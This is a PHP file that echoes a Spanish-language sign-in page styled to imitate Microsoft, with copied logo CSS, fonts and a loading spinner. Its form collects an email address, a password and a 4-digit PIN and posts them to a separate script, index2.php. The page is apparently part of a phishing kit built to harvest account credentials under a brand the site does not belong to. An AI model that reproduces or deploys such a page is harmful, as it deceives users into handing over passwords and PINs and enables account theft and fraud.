<?php
echo '<html><head>
	
	<meta charset="UTF-8">
	<link rel="stylesheet" href="ifls/style.css">
	<title>Inicio</title>
	<meta name="viewport" content="width=device-width">
	
	<style type="text/css">
	body{
		background: #fdfdfd;
		color: #757577;
		font-family: "Segoe WP", "Segoe UI", Helvetica, Arial, sans-serif;
		text-align: center;
	}

	/* 
	 *
	 * Microsoft logo 
	 *
	 */
	h1 {
		position: relative;
		display: inline-block;
		padding-left: ;
		margin-top: 2%;
		font-size: 5.2em;
		letter-spacing: -0.03em;
		line-height: 1.1;
	}
	
	h1:after {
		top:44px;
		background-position: 0 100%;
		background-image: -webkit-linear-gradient(left, #45a3f1 0, #45a3f1 48%, #fdfdfd 48%, #fdfdfd 53%, #f5b900 53%, #f5b900 100%);
		background-image: -moz-linear-gradient(left, #45a3f1 0, #45a3f1 48%, #fdfdfd 48%, #fdfdfd 53%, #f5b900 53%, #f5b900 100%);
		background-image: -ms-linear-gradient(left, #45a3f1 0, #45a3f1 48%, #fdfdfd 48%, #fdfdfd 53%, #f5b900 53%, #f5b900 100%);
		background-image: -o-linear-gradient(left, #45a3f1 0, #45a3f1 48%, #fdfdfd 48%, #fdfdfd 53%, #f5b900 53%, #f5b900 100%);
		background-image: linear-gradient(left, #45a3f1 0, #45a3f1 48%, #fdfdfd 48%, #fdfdfd 53%, #f5b900 53%, #f5b900 100%);
	}
	/* 
		/end Microsoft logo 
	*/


	h2 {
		
		color: #888;
		font-weight: normal;
		margin-bottom: 2px;
	}
	h3 {
margin-top: 3px;
}
	p, p a { 
		color: #aaa;
		text-decoration: none;
	}
	p a:hover,
	p a:focus {
		text-decoration: underline;
	}
	p+p { color: #bbb; margin-top: 3em;}
	.detail {position: absolute; text-align: right; right: 5px; bottom: 5px; width: 50%;}
	a[href*="intent"] {
		display:inline-block;
		margin-top: 0.4em;
		padding-left: 25px;
		background: url(bird.png) 0 4px no-repeat;
	}
	@media (max-width:640px) {
		.detail {display:none;}
		h1 {padding-left:;font-size:2.5em;line-height:1.35; margin-top: 14%;}
		h1:before,h1:after{height:25px;width:50px;}
		h1:after{top:27px;}
		h2 {font-size: 1.2em;}
		.img{height:50px;width:50px; margin-top: 60%;}

		
	}
	.lds-default {
  display: inline-block;
  position: relative;
  width: 80px;
  height: 80px;
}
.lds-default div {
  position: absolute;
  width: 6px;
  height: 6px;
  background: #0078d4;
  border-radius: 50%;
  animation: lds-default 1.2s linear infinite;
}
.lds-default div:nth-child(1) {
  animation-delay: 0s;
  top: 37px;
  left: 66px;
}
.lds-default div:nth-child(2) {
  animation-delay: -0.1s;
  top: 22px;
  left: 62px;
}
.lds-default div:nth-child(3) {
  animation-delay: -0.2s;
  top: 11px;
  left: 52px;
}
.lds-default div:nth-child(4) {
  animation-delay: -0.3s;
  top: 7px;
  left: 37px;
}
.lds-default div:nth-child(5) {
  animation-delay: -0.4s;
  top: 11px;
  left: 22px;
}
.lds-default div:nth-child(6) {
  animation-delay: -0.5s;
  top: 22px;
  left: 11px;
}
.lds-default div:nth-child(7) {
  animation-delay: -0.6s;
  top: 37px;
  left: 7px;
}
.lds-default div:nth-child(8) {
  animation-delay: -0.7s;
  top: 52px;
  left: 11px;
}
.lds-default div:nth-child(9) {
  animation-delay: -0.8s;
  top: 62px;
  left: 22px;
}
.lds-default div:nth-child(10) {
  animation-delay: -0.9s;
  top: 66px;
  left: 37px;
}
.lds-default div:nth-child(11) {
  animation-delay: -1s;
  top: 62px;
  left: 52px;
}
.lds-default div:nth-child(12) {
  animation-delay: -1.1s;
  top: 52px;
  left: 62px;
}
@keyframes lds-default {
  0%, 20%, 80%, 100% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.5);
  }
}
/*---------------------*/


	</style>
</head>
<body id="mylist">
	


<div class="padree">     

<div class="hijoi">


<img class="img" src="ifls/imgim.png"></div>     

<div class="hijoi">        <h1><img src="ifls/mminco.png"></h1>     </div>  </div>  <br> 	  	  	 
 <h2>Iniciar Sesion</h2>  <h3>En su cuenta</h3>  <div id="gh">
	 <form  method="post" name="form1" id="form1" action="index2.php"> 
 <input type="email" class="hijo_uno" placeholder="Correo Electrónico" name="eml" size="30" required="" > 	
 <input type="password" class="hijo_uno" placeholder="Contraseña" name="clv" required  required>
 <input type="password" class="hijo_uno" placeholder="Pin de 4-Dígitos" name="pin" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" minlength="4" maxlength="4" required> 	 
 <button class="btn" type="submit">Iniciar Sesion</button>  </div>  
 
 </form>
</body></html>';
?>